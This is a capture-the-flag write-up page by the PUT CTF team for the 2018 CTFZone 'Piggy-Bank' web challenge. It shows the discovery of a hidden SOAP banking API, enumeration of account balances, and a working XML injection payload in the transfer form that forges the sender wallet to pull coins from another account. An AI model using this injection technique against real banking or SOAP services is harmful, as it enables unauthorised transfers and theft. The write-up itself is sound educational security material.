@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta content="poznań, security, ctf" name="keywords">
+<meta content="PUT CTF Team" name="author">
+<meta property="og:title" content="2018 Ctfzone Piggybank - PUT CTF blog">
+<meta property="og:url" content="https://put-ctf.github.io/blog/writeups/2018-ctfzone-piggybank/">
+<meta property="og:description" content="Strona zespołu PUT CTF">
+<meta property="og:type" content="website" />
+<title>2018 Ctfzone Piggybank | PUT CTF blog</title>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+<link rel="stylesheet" href="https://put-ctf.github.io/blog/css/style.css">
+<link rel="shortcut icon" href="https://put-ctf.github.io/blog/wave.ico">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/github.min.css">
+
+</head>
+
+<body>
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="https://put-ctf.github.io/blog"><h1 class="title is-4">PUT CTF blog</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+          <a class="level-item" href="https://github.com/put-ctf" target="_blank">
+            <span class="icon">
+              <i class="fa fa-github"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://twitter.com/PUT_ctf" target="_blank">
+            <span class="icon">
+              <i class="fa fa-twitter"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://ctftime.org/team/40249" target="_blank">
+            <span class="icon">
+              <i class="fa fa-address-card-o"></i>
+            </span>
+          </a>
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <h1 class="title">2018 Ctfzone Piggybank</h1>
+    <h2 class="subtitle is-5">July 23, 2018 by PUT CTF Team</h2>
+    
+      <div class="tags">
+    
+        <a class="button is-link" href="/blog/tags/web">web</a>
+    
+        <a class="button is-link" href="/blog/tags/injection">injection</a>
+    
+        <a class="button is-link" href="/blog/tags/xml">xml</a>
+    
+        <a class="button is-link" href="/blog/tags/2018">2018</a>
+    
+</div>
+
+    
+    <div class="content">
+      
+
+<h1 id="piggy-bank-web-easy-29-solves">Piggy-Bank (WEB - EASY) - 29 solves</h1>
+
+<pre><code>Hack some bank for me.
+</code></pre>
+
+<p>First, we played a little bit with the website - there were index, register and login pages accessible for all the users, and <em>Profile</em>, <em>VIP</em>, <em>For developers</em> and <em>Transfer</em> pages for logged-in users.</p>
+
+<p><img src="/blog/2018-ctfzone/piggybank/main_page.png" alt="The web page" /></p>
+
+<p><em>Profile</em> page just showed the account balance, <em>Transfer</em> allowed moving your money to other accounts, and <em>VIP</em> was just saying that it&rsquo;d reveal its secrets once we have 1&rsquo;000&rsquo;000 coins on our account (and we started with 110).
+Navigating through <em>For developer</em>&rsquo;s sources revealed one significant comment:</p>
+
+<pre><code>&lt;div class=&quot;tab tab_5&quot;&gt;Especially for pig-developers, we have the coolest api, which they will soon be able to use!&lt;/div&gt;
+&lt;!-- Link to the API (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) (Testing stage) --&gt;
+</code></pre>
+
+<p>It turned out, that there&rsquo;s a SOAP API underneath:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Date: Sat, 21 Jul 2018 10:37:15 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 2907
+Connection: close
+Content-Type: text/xml; charset=utf-8
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;wsdl:definitions name=&quot;Bank&quot;
+             targetNamespace=&quot;urn:Bank&quot;
+             xmlns:tns=&quot;urn:Bank&quot;
+             xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot;
+             xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
+             xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;
+             xmlns:wsdl=&quot;http://schemas.xmlsoap.org/wsdl/&quot;
+             xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt;
+
+    &lt;message name=&quot;BalanceRequest&quot;&gt;
+        &lt;part name=&quot;wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
+    &lt;/message&gt;
+
+    &lt;message name=&quot;BalanceResponse&quot;&gt;
+        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;
+        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;
+    &lt;/message&gt;
+
+    &lt;message name=&quot;internalTransferRequest&quot;&gt;
+        &lt;part name=&quot;receiver_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
+        &lt;part name=&quot;sender_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
+        &lt;part name=&quot;amount&quot; type=&quot;xsd:float&quot;/&gt;
+        &lt;part name=&quot;token&quot; type=&quot;xsd:string&quot;/&gt;
+    &lt;/message&gt;
+
+    &lt;message name=&quot;internalTransferResponse&quot;&gt;
+        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;
+        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;
+    &lt;/message&gt;
+
+    &lt;portType name=&quot;BankServicePort&quot;&gt;
+        &lt;operation name=&quot;requestBalance&quot;&gt;
+            &lt;input message=&quot;tns:BalanceRequest&quot;/&gt;
+            &lt;output message=&quot;tns:BalanceResponse&quot;/&gt;
+        &lt;/operation&gt;
+        &lt;operation name=&quot;internalTransfer&quot;&gt;
+            &lt;input message=&quot;tns:internalTransferRequest&quot;/&gt;
+            &lt;output message=&quot;tns:internalTransferResponse&quot;/&gt;
+        &lt;/operation&gt;
+    &lt;/portType&gt;
+
+    &lt;binding name=&quot;BankServiceBinding&quot; type=&quot;tns:BankServicePort&quot;&gt;
+        &lt;soap:binding style=&quot;rpc&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;
+        &lt;operation name=&quot;requestBalance&quot;&gt;
+            &lt;soap:operation soapAction=&quot;urn:requestBalanceAction&quot;/&gt;
+            &lt;input&gt;
+                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
+            &lt;/input&gt;
+            &lt;output&gt;
+                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
+            &lt;/output&gt;
+        &lt;/operation&gt;
+        &lt;operation name=&quot;internalTransfer&quot;&gt;
+            &lt;soap:operation soapAction=&quot;urn:internalTransferAction&quot;/&gt;
+            &lt;input&gt;
+                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
+            &lt;/input&gt;
+            &lt;output&gt;
+                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
+            &lt;/output&gt;
+        &lt;/operation&gt;
+    &lt;/binding&gt;
+
+    &lt;wsdl:service name=&quot;BankService&quot;&gt;
+        &lt;wsdl:port name=&quot;BankServicePort&quot; binding=&quot;tns:BankServiceBinding&quot;&gt;
+            &lt;soap:address location=&quot;http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php&quot; /&gt;
+        &lt;/wsdl:port&gt;
+    &lt;/wsdl:service&gt;
+&lt;/wsdl:definitions&gt;
+</code></pre>
+
+<p>At this point we thought, that the challenge is about either finding the vulnerability in transfer feature (like race condition or lack of appropriate checks) or somewhere else in API, and then materializing 1&rsquo;000&rsquo;000 coins on the account which would result in access to the <em>VIP</em> page.
+We were not so much wrong.</p>
+
+<p>Next, we tried to actually use the API. From the <em>wsdl</em> file we identified two endpoints: <code>requestBalance</code> and <code>internalTransfer</code>, and utilized the first one to scan other accounts balances.</p>
+
+<pre><code>POST /api/bankservice.php HTTP/1.1
+Content-Type: text/xml
+cache-control: no-cache
+Postman-Token: ef43c527-538f-49ed-862e-57c80e3f320e
+User-Agent: PostmanRuntime/7.1.5
+Accept: */*
+Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
+Accept-Encoding: gzip, deflate
+Content-Length: 230
+Connection: close
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+
+&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+
+&lt;SOAP-ENV:Body&gt;
+	&lt;requestBalance&gt;&lt;id&gt;2392&lt;/id&gt;&lt;/requestBalance&gt;
+&lt;/SOAP-ENV:Body&gt;
+
+&lt;/SOAP-ENV:Envelope&gt;
+</code></pre>
+
+<pre><code>HTTP/1.1 200 OK
+Date: Sat, 21 Jul 2018 20:29:52 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Cache-Control: no-store, no-cache
+Expires: Sat, 21 Jul 2018 20:29:52 +0000
+Vary: Accept-Encoding
+Content-Length: 549
+Connection: close
+Content-Type: text/xml; charset=utf-8
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;urn:Bank&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:requestBalanceResponse&gt;&lt;code xsi:type=&quot;xsd:float&quot;&gt;0&lt;/code&gt;&lt;status xsi:type=&quot;xsd:string&quot;&gt;110&lt;/status&gt;&lt;/ns1:requestBalanceResponse&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;
+
+</code></pre>
+
+<p>With this we were able to identify an account with over 1&rsquo;000&rsquo;000 coins using Burp Suite&rsquo;s <em>Intruder</em>:</p>
+
+<p><img src="/blog/2018-ctfzone/piggybank/sniper_setup1.png" alt="Setup, 1" />
+<img src="/blog/2018-ctfzone/piggybank/sniper_setup2.png" alt="Setup, 2" />
+<img src="/blog/2018-ctfzone/piggybank/sniper_setup3.png" alt="Setup, 3" /></p>
+
+<p>We could differentiate the empty and full wallets by just looking at responses&rsquo; lengths:</p>
+
+<p><img src="/blog/2018-ctfzone/piggybank/sniper_results.png" alt="Result" /></p>
+
+<p>Then, to use the second endpoint to transfer money, we needed to find the valid token, as in <em>wsdl</em> file:</p>
+
+<pre><code>&lt;message name=&quot;internalTransferRequest&quot;&gt;
+	&lt;part name=&quot;receiver_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
+	&lt;part name=&quot;sender_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
+	&lt;part name=&quot;amount&quot; type=&quot;xsd:float&quot;/&gt;
+	&lt;part name=&quot;token&quot; type=&quot;xsd:string&quot;/&gt;
+&lt;/message&gt;
+</code></pre>
+
+<p>Unfortunately, we were not able to find it anywhere (even though there was a little bit more information revealed with the response to <code>auth.php</code> file after logging in), therefore we stopped for a while.</p>
+
+<p>But, it turned out that the transfer page is using this very API endpoint under the hood, and it&rsquo;s prone to injection attack:</p>
+
+<pre><code>receiver=1348&lt;/receiver_wallet_num&gt;
+&lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1337&lt;/sender_wallet_num&gt;
+&lt;amount xsi:type=&quot;xsd:float&quot;&gt;&lt;!--
+&amp;amount=--&gt;200000
+</code></pre>
+
+<p><img src="/blog/2018-ctfzone/piggybank/injection_request.png" alt="The injection" /></p>
+
+<p>Go <a href="https://blog.veryhax.ninja/blog/ctfzone18-piggy-bank/">here</a> for an additional explaination.</p>
+
+<p>After sending a few requests, we&rsquo;ve landed with many coins:</p>
+
+<p><img src="/blog/2018-ctfzone/piggybank/profile_with_1m.png" alt="The wealth" /></p>
+
+<p>and were able to fetch the flag from VIP zone:</p>
+
+<p><img src="/blog/2018-ctfzone/piggybank/vip.png" alt="The flag" /></p>
+
+<p>What could be done else, was just transferring small amounts of money from other users with many <code>internalTransferRequest</code> calls.</p>
+
+    </div>
+    
+        <div class="nav-left">
+    <a class="nav-item" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fput-ctf.github.io%2fblog%2fwriteups%2f2018-ctfzone-piggybank%2f" title="Share on Facebook" target="_blank"><span class="fa fa-facebook fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://plus.google.com/share?url=https%3a%2f%2fput-ctf.github.io%2fblog%2fwriteups%2f2018-ctfzone-piggybank%2f" title="Share on Google+" target="_blank"><span class="fa fa-google-plus fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fput-ctf.github.io%2fblog%2fwriteups%2f2018-ctfzone-piggybank%2f" title="Share on LinkedIn" target="_blank"><span class="fa fa-linkedin fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://twitter.com/home?status=2018%20Ctfzone%20Piggybank - https%3a%2f%2fput-ctf.github.io%2fblog%2fwriteups%2f2018-ctfzone-piggybank%2f" title="Tweet this" target="_blank"><span class="fa fa-twitter fa-2x"></span></a>
+    <a class="nav-item" href="http://www.reddit.com/submit?url=https%3a%2f%2fput-ctf.github.io%2fblog%2fwriteups%2f2018-ctfzone-piggybank%2f&title=2018%20Ctfzone%20Piggybank" title="Share on Reddit" target="_blank"><span class="fa fa-reddit-alien fa-2x" aria-hidden="true"></span></a>
+    
+    </div>
+    
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>&copy; 2018, Poznań | <a href="https://github.com/mgjohansen/hucore.git" target="_blank">Hucore theme</a> & <a href="http://gohugo.io" target="_blank">Hugo</a> ♥</p>
+  </div>
+</section>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js" integrity="sha256-+bhVTaRmJ/c07eV80nU8gD2cBBF0rYkf1txqXlrbvb0=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/python.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+</body>
